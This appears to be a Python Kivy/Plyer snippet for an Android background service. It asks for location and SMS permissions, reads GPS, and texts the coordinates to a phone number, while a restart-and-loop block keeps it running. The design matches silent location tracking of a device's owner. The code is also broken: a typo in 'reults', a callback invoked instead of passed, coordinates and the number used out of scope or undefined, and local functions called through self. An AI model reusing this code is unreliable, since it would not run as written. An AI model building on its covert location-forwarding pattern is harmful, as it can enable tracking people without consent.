""" 
class Service(App):
    def on_start(self):
        def open_gps_access_popup(self):
            dialog = MDDialog(title="GPS error", text="Включите GPS")
            dialog.size_hint = [0.8, 0.8]
            dialog.pos_hint = {'center_x': 0.5, 'center_y': 0.5}
            dialog.open()

        def update_info(self, *args, **kwargs):
            latitude = kwargs['lat']
            longtitude = kwargs['lon']
            print("GPS position: ", latitude, longtitude)
        
        def on_auth_status(self, general_status, status_message):
            if general_status == 'provider-enabled':
                pass
            else:
                self.open_gps_access_popup()
        
        if platform == 'android':
            def callback(permission, results):
                if all([res for res in reults]):
                    print("Got all permissions")
            request_permissions([Permission.ACCESS_COARSE_LOCATION, Permission.ACCESS_FINE_LOCATION, Permission.SEND_SMS], callback())
        if platform == 'android' or platform == 'ios':
            gps.configure(on_location=self.update_info, on_status=self.on_auth_status)
            gps.start(minTime=10000, minDistance=0)
            recipient = number
            message = f"{longtitude} {latitude}"
            sms.send(recipient, message)

if __name__ == '__main__':
    Service().run()


PythonService = autoclass('org.kivy.android.PythonService')
PythonService.mService.setAutoRestartService(True)
while True:
    print("Service works))))))")
    sleep(5)
                
        
 """